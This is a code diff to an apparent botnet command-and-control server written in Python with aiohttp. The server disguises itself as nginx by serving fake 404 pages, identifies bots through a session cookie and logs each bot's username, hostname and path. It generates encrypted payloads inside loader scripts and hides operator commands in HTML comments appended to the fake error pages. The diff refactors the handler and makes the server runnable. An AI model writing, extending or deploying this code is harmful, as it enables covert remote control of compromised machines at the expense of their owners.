@@ -72,20 +72,34 @@ async def start_server(model, view, port, host=""):
         port: Server listening port.
         host: Host address to bind to (default: 0.0.0.0)
     """
-    _RequestHandler._model = model
-    _RequestHandler._view = view
-    _RequestHandler._server_port = port
+    if not HAS_AIOHTTP:
+        raise RuntimeError("aiohttp is required to run the server. Install it via: pip install aiohttp")
+
+    OptimizedRequestHandler._model = model
+    OptimizedRequestHandler._view = view
+    OptimizedRequestHandler._server_port = port
 
     app = web.Application()
-    app.router.add_route("*", "/{tail:.*}", _RequestHandler.handle_request)
+    # Catch-all route for all paths (aiohttp default behavior).
+    app.router.add_route("*", "/{tail:.*}", OptimizedRequestHandler.handle_request)
 
+    # Standard aiohttp runner (simpler, more reliable)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, host or "", port)
     await site.start()
 
+    bind_addr = host if host else "0.0.0.0"
+    view.display_info(f"Server listening on http://{bind_addr}:{port}")
 
-class _RequestHandler:
+    try:
+        await asyncio.Event().wait()
+    finally:
+        await runner.cleanup()
+
+
+
+class OptimizedRequestHandler:
     """Async request handler with non-blocking I/O.
 
     Architecture:
@@ -119,12 +133,16 @@ class _RequestHandler:
           - Cache hit rate: >85% after warmup period
         """
         # ========== STEP 0: Match nginx's request-level rejections ==========
+        # A real nginx answers 405 for any method its static module does not
+        # serve, and 400 for a malformed request line (empty path), both with
+        # the same page/host headers as everything else.
         method = request.method.upper()
         if method not in nginx_facade.NGINX_STATIC_METHODS:
             return nginx_facade.nginx_error(
                 405, "Not Allowed", _connection_for(request))
 
         # ========== STEP 1: Parse URL path ==========
+        # yarl.URL is not a str: use .raw_path (path only, query stripped).
         raw_path = request.raw_path
         if not raw_path.startswith("/") or raw_path == "":
             return nginx_facade.nginx_error(
@@ -132,15 +150,15 @@ class _RequestHandler:
         url_path = raw_path.split("/", 4)[-1] or ""
 
         # Check upload files first (file serving)
-        if _RequestHandler._model is not None:
-            upload_files = _RequestHandler._model.get_upload_files()
+        if OptimizedRequestHandler._model is not None:
+            upload_files = OptimizedRequestHandler._model.get_upload_files()
 
             for served_path, local_path in upload_files:
                 if served_path == url_path and path.isfile(local_path):
                     try:
                         return _serve_file(request, local_path, served_path)
                     except OSError as ex:
-                        _RequestHandler._view.output(
+                        OptimizedRequestHandler._view.output(
                             "Upload serving failed: {}".format(ex), "attention")
                         break
 
@@ -148,6 +166,7 @@ class _RequestHandler:
         cookie = request.headers.get("Cookie")
 
         if not cookie:
+            # No cookie — pristine nginx 404, nothing for this client.
             return _not_found(request)
 
         try:
@@ -158,6 +177,7 @@ class _RequestHandler:
             if raw.lower().startswith("session="):
                 raw = raw.split("=", 1)[1]
 
+            # Split on first dash only (UID may contain dashes after base64 decode)
             sep_index = raw.find("-")
             if sep_index == -1:
                 raise ValueError("session cookie missing uid/data separator")
@@ -170,19 +190,21 @@ class _RequestHandler:
             request_type = int(data["type"])
 
         except Exception as ex:
-            _RequestHandler._view.output("Bad bot cookie: {}".format(ex), "attention")
+            OptimizedRequestHandler._view.output("Bad bot cookie: {}".format(ex), "attention")
             return _not_found(request)
 
         # ========== STEP 3: Handle request type ==========
         if request_type == RequestType.STAGE_1:
+            # Stage 1: generate encrypted payload
             payload_options = data.get("payload_options", {})
             loader_options = data.get("loader_options", {})
 
-            encrypted = _RequestHandler._payload_factory.create_payload(
+            encrypted = OptimizedRequestHandler._payload_factory.create_payload(
                 bot_uid, payload_options, loader_options)
 
+            # Wrap in loader script
             loader_name = loader_options.get("loader_name", "python")
-            wrapped = _RequestHandler._payload_factory.wrap_loader(
+            wrapped = OptimizedRequestHandler._payload_factory.wrap_loader(
                 loader_name, loader_options, encrypted)
 
             response = _build_command_response(wrapped)
@@ -190,51 +212,67 @@ class _RequestHandler:
                                 body=response.encode("latin-1"))
 
         elif request_type == RequestType.GET_COMMAND:
+            # GET_COMMAND: fetch command from DB
             username = data.get("username", "")
             hostname = data.get("hostname", "")
             local_path = data.get("path", "")
             version = data.get("version", "")
             loader_name = data.get("loader_name", "")
 
-            bot = _RequestHandler._model.get_cached_bot(bot_uid)
+            # Register/update bot
+            bot = OptimizedRequestHandler._model.get_cached_bot(bot_uid)
             if bot is None:
                 from server.model import Bot as BotModel
                 bot = BotModel(
                     bot_uid=bot_uid, username=username, hostname=hostname,
                     last_online=time(), local_path=local_path,
                     system_version=version, loader_name=loader_name)
-                _RequestHandler._model.add_bot(bot)
+                OptimizedRequestHandler._model.add_bot(bot)
             else:
-                _RequestHandler._model.update_bot(
+                OptimizedRequestHandler._model.update_bot(
                     bot_uid, time(), local_path)
 
+            # Handle global command execution tracking
             has_executed_global, global_command = \
-                _RequestHandler._model.has_executed_global(bot_uid)
+                OptimizedRequestHandler._model.has_executed_global(bot_uid)
 
             if not has_executed_global:
-                _RequestHandler._model.add_executed_global(bot_uid)
+                OptimizedRequestHandler._model.add_executed_global(bot_uid)
                 response = _build_command_response(global_command)
             else:
-                cmd = _RequestHandler._model.get_command_raw(bot_uid)
+                # Get command from cache or DB (cached result avoids re-query)
+                cmd = OptimizedRequestHandler._model.get_command_raw(bot_uid)
+
                 if cmd is None:
                     cmd = ""
+
                 response = _build_command_response(cmd)
 
             return web.Response(status=200, content_type="text/html",
                                 body=response.encode("latin-1"))
 
         else:
+            # Unknown request type — 404 with hidden command
             response = _build_error_page(request.url)
             return web.Response(status=404, content_type="text/html",
                                 body=response.encode("latin-1"))
 
 
 def _debug_suffix(command_raw: str = "") -> str:
-    """Hidden command blob, appended to the nginx 404 page."""
+    """Hidden command blob, appended to the nginx 404 page.
+
+    The bot (``bot/bot.py::_extract_debug_payload``) splits on the first
+    ``DEBUG:`` it finds and strips the closing ``DEBUG-->``.  Nothing before
+    the marker is parsed, so the blob can trail any body.
+
+    :param command_raw: base64 command blob (may be empty).
+    :return: the stub body suffix, or "" when there is nothing to send.
+    """
     if not command_raw:
         return ""
-    if "DEBUG-->" in command_raw:
+    if "DEBUG-->" in command_raw:  # would truncate the bot's parse
         raise ValueError("command payload must not contain the closing marker")
+    # Bot splits on exactly DEBUG + newline (no extra blank line)
     return "<!--" + "\n" + "DEBUG:" + "\n" + command_raw + "DEBUG-->" + "\n"
 
 
@@ -257,6 +295,7 @@ def _build_command_response(command_raw: str = "") -> str:
 """).format("/unknown")
 
     if command_raw != "":
+        # Bot splits on exact bytes DEBUG + newline (no extra blank line)
         response += '<!--' + chr(10) + 'DEBUG:' + chr(10) + command_raw + 'DEBUG-->' + chr(10)
 
     return response
@@ -297,10 +336,20 @@ def _serve_file(request, local_path: str, url_path: str):
 
 
 # Singleton payload factory (shared across all handlers)
-_RequestHandler._payload_factory = PayloadFactory()
+OptimizedRequestHandler._payload_factory = PayloadFactory()
 
 
 if __name__ == "__main__":
     import sys
+    import asyncio
+
+    from server.model import Model
+    from server.view.cli import ConsoleView
+
+    model = Model(db_path=None)
+    view = ConsoleView()
+
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
-    print(f"Optimized handler ready on port {port}")
+    host = sys.argv[2] if len(sys.argv) > 2 else ""
+
+    asyncio.run(start_server(model, view, port, host))
